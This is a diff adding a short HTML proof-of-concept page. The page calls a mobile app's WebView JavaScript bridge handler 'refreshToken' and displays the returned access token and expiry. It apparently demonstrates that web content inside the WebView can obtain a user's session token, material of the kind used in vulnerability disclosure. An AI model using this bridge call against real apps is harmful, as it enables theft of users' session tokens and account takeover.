@@ -1,0 +1,20 @@
+<html>
+  <body>
+    <h1>RefreshToken PoC</h1>
+    <pre id="result">Waiting for token...</pre>
+    
+    <script>
+    window.WebViewJavascriptBridge.callHandler("refreshToken", "", function(resp) {
+      document.getElementById("result").innerText = "Token Response:\n" + resp;
+
+      try {
+        const json = JSON.parse(resp);
+        document.getElementById("result").innerText =
+          "Access Token:\n" + json.token + "\n\nExpires In: " + json.expiresIn;
+      } catch (e) {
+        document.getElementById("result").innerText = "Error parsing response:\n" + resp;
+      }
+    });
+    </script>
+  </body>
+</html>
